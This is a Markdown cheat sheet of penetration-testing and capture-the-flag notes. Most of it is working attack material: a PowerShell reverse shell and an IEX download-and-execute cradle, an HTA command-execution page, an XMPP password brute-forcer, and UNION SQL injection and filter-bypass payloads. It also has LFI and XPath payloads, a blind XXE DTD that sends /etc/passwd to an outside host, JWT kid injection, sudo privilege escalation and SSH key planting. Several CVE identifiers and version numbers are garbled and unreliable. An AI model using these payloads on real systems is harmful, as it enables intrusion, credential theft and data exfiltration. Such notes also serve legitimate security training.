# Notes

### Client-Side .hta (HTML-based Internet Explorer only) Code Execution
```html
<html>
	<body>
		<script>
			var c= 'cmd.exe'
			new ActiveXObject('WScript.Shell').Run(c);
		</script>
	</body>
</html>
```

### Fingerprinting Client-Side Victim
https://github.com/fingerprintjs/fingerprintjs2

### Scan Security Headers
https://securityheaders.com/

### PowerShell to retrieve Active Directory objects (including deleted)
```Get-ADObject```

### Decode LDAP Passwords
https://dotnetfiddle.net/2RDoWz

### mysql command line alternative
```
mysqldump
```

### TTY Shell that works almost every time on Linux
```
/usr/bin/script -qc /bin/bash /dev/null
```

### Kerberos check for valid usernames or bruteforce user/pass with kerbrute
```
kerbrute
```
https://github.com/TarlogicSecurity/kerbrute

### Crawls web pages for keywords
```
cewl
```
### TeamViewer Privilege Escalation -> CVE-2019-189888
```
meterpreter > run post/windows/gather/credentials/teamviewer_passwords
```

### PowerShell Reverse Shell
```
$client = New-Object System.Net.Sockets.TCPClient('192.168.0.0',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

$sm=(New-Object Net.Sockets.TCPClient('192.168.0.0',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}

```

Pull the shell:
```
powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('SHELL URL')"
```

### Wget Alternative for Windows in PowerShell
```
$client = new-object System.Net.WebClient
$client.DownloadFile("URL","Local Download Path")
```

### CVE-2019-10-15 Sudo < 1.2.28 Privilege Escalation
``sudo -u#-1 /bin/bash``

### Adminer Database Management Tool Exploit Bypass Login
https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool

### Alternate data streams of empty or incomplete file on SMB
``allinfo *file*``

### SMB Recursively List Files
``recurse on``
<br>
``ls``

### Telnet > Netcat
When connecting to a service, where possible, choose TELNET over Netcat 

### /etc/update-motd.d Privilege Escalation
https://blog.haao.sh/writeups/fowsniff-writeup/

### SSH into Victim without password
1. From the attacker machine generate RSA keypair: ``ssh-keygen -t rsa``
2. Copy the public key (id_rsa.pub) into the ``.ssh/authorized_keys`` file of the victim
3. SSH with the -i argument (id_rsa)

### Really Good Privilege Escalation Scripts
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite


### XMPP Authentication Crack
```python
import base64
import hashlib
import hmac
import itertools

charset = "_abcdefghijklmnopqrstuvwxyz"

initial_message = "n=,r="
server_first_message = "r=,s=,i="
server_final_message_compare = "v="
r = server_first_message[2:server_first_message.find('s=')-1]
s = server_first_message[server_first_message.find('s=')+2:server_first_message.find('i=')-1]
i = server_first_message[server_first_message.find('i=')+2:]

for passlen in range(1,3):
	print "test passlen %d" % passlen
	for k in itertools.permutations(charset, passlen):
		password = "koma" + "".join(k)
		salt = base64.b64decode(s)
		client_final_message_bare = 'c=biws,r=' + r
		salt_password = hashlib.pbkdf2_hmac('sha1', password, salt, int(i))
		auth_message = initial_message + ',' + server_first_message + ',' + client_final_message_bare
		server_key = hmac.new(salt_password, 'Server Key', hashlib.sha1).digest()
		server_signature = hmac.new(server_key, auth_message, hashlib.sha1).digest()
		server_final_message = 'v=' + base64.b64encode(server_signature)
		if server_final_message == server_final_message_compare:
			print "found the result"
			print password
			h = hashlib.new('sha1')
			h.update(password)
			print h.hexdigest()
			exit(-1)



```



### CTF Docs
```
https://github.com/welchbj/ctf/tree/master/docs
```

### Test for LDAP NULL BIND
```
ldapsearch -H ldap://host:port -x -s base '' "(objectClass=*)" "*" +
```


### Extract VBA Script from document
```
https://www.onlinehashcrack.com/tools-online-extract-vba-from-office-word-excel.php
```

### Decode Rubber Ducky USB .bin payloads
```
https://ducktoolkit.com/decode#
```

### Crack Android lockscreen from system files (gesture.key)
```
https://github.com/KieronCraggs/GestureCrack
```

### XOR Analysis
```
https://github.com/hellman/xortool
```

### Cryptanalysis 
```
https://github.com/nccgroup/featherduster
```

### RSA Cracking Tools
```
https://github.com/Ganapati/RsaCtfTool
https://github.com/ius/rsatool
```


### Morse Code Audio Decode
```
https://morsecode.world/international/decoder/audio-decoder-adaptive.html
```

### Text to 21 Common Ciphers
```
https://v2.cryptii.com/text/select
```
 

### Crypto Example Challs
```
https://asecuritysite.com/encryption/ctf?mybutton=
```


### Shift in Python


```python
with open('FILENAME') as f:
    msg = f.read()
    for x in range(256):
        print ''.join([chr((ord(y) + x) % 256) for y in msg])
```

### Predict encoding type
```
https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')
```

### Get data, process and respond over a socket
```python
import socket
import re


clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientsocket.connect(('IP', PORT))
data = clientsocket.recv(1024)
print data
result = re.sub('[^0-9]', '', data) #Retrieve the digits (or numbers) only from input
print result
clientsocket.send(str(result))
data = clientsocket.recv(1024)
print data

```



### Extract domain names & hosts from PCAP
*Domain Names*
```
tshark -r *PCAP* -Y 'dns' -T fields -e dns.qry.name | sort -u > dns.txt
```
*Hosts*
```
tshark -r *PCAP* -Y 'tls.handshake.extensions_server_name' -T fields -e tls.handshake.extensions_server_name | sort -u > hosts.txt
```


### Manual UNION SQLite Injection
*Table*
```sql
1' union all select 1,tbl_name,3 FROM sqlite_master WHERE type='table' limit 0,1 --
```
*Columns (as command)*
```sql
1' union all select 1,sql,3 FROM sqlite_master WHERE type='table' and tbl_name='nameoftable' limit 0,1 -- 
```
*Values (payload depends on the columns structure)*
```sql
1' union all select 1,"nameofcolumn",3 FROM "nameoftable" limit 2,1 --
```

### SQL Injection Little Tips
```-- ``` -> Linux <br>
```--+``` -> Windows <br>
```%23 (#)``` -> Hash <br>
``` %2527 (')``` -> bypass urldecode(urldecode(htmlspecialchars(, ENT_QUOTES)));


### Manual UNION SQL Injection
*Table*
```sql
1' union select (select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),2#
```
*Columns*
```sql
1' union select (select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='nameoftable'),2#
```
*Values*
```sql
1' union select (select nameofcolumn from nameoftable limit 0,1),2#
```
*Using Newline*
```sql
admin %0A union %0A select %0A 1,database()#
           or
admin %0A union %0A select %0A database(),2#   
```
*Bypass preg_replace*
```sql
ununionion select 1,2%23
     or
UNunionION SEselectLECT 1,2,3%23
```


### Known Plaintext ZIP
*Download pkcrack*
```
https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack/download1.html

! Before using, it must be built from source
```

*Syntax*
```
./pkcrack -C encrypted.zip -c file -P plaintext.zip -p file
```




### Python Functions
Files: https://www.w3schools.com/python/python_ref_file.asp <br>
Strings: https://www.w3schools.com/python/python_ref_string.asp <br>
Keyworks: https://www.w3schools.com/python/python_ref_keywords.asp <br>
Random: https://www.w3schools.com/python/module_random.asp <br>




### PHP Functions

Files: https://www.w3schools.com/php/php_ref_filesystem.asp <br>
Directories: https://www.w3schools.com/php/php_ref_directory.asp <br>
Errors: https://www.w3schools.com/php/php_ref_error.asp <br>
Network: https://www.w3schools.com/php/php_ref_network.asp <br>
Misc: https://www.w3schools.com/php/php_ref_misc.asp



### PHP Jail Escape
*With file_get_contents()*
```php
print file_get_contents('flag.txt');
```
*With readfile()*
```php
echo readfile("flag.txt");
```

*With popen()*
```php
popen("vi", "w");

:r flag.txt
   or
:!/bin/bash
```

*With highlight_file()*
```php
highlight_file(glob("flag.txt")[0]);
   or
highlight_file(glob("fl*txt")[0]);
```

*With highlight_source()*
```php
highlight_source("flag.txt");
   or
highlight_source(glob("*")[4]);
```

*With Finfo()*
```php
new Finfo(0,glob(hex2bin(hex2bin(3261)))[0]);
```

### XPATH Dump
```
https://example.com/accounts.php?user=test"]/../*%00&xpath_debug=1
```


### LFI Retrieve File without executing it
```
https://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
```

### Useful PCAP Reader
```
chaosreader
```

### ZIP Format Signatures

*HEADER*
```
50 4B 03 04 14
```
*FOOTER*
```
50 4B 05 06 00
```


### JWT KID Value Exploitation
*Sign with public file from server*
```
kid: public/css/file.css

wget file.css from target

manipulate token using jwt_tool and sign it with file.css
```

*SQL Injection*
```
kid: test' UNION SELECT 'key';--

manipulate token using jwt_tool and sign it using the secret -> 'key'
```


### Blind XXE to SSRF

*ON TARGET*

```xml
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "*HOST ADDRESS OF DTD FILE (preferably on github)*">
<foo>&e1;</foo>
````

*INSIDE DTD FILE*

```xml
<!ENTITY % p1 SYSTEM "file:///etc/passwd">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM '*RANDOM HTTP HOST (like https://requestbin.com/)*/%p1;'>">
%p2;
```


### Hidden terminal input history
```bash
find . -name .bash_history -exec grep -A 1 '^passwd' {} \;
```

### Search file by name pattern
```bash
find -name "*PATTERN*" 2>/dev/null
```

### Search string
```bash
grep -r "STRING" / 2>/dev/null
```

### Check SUDO privileges/rights
```bash
sudo -l
```
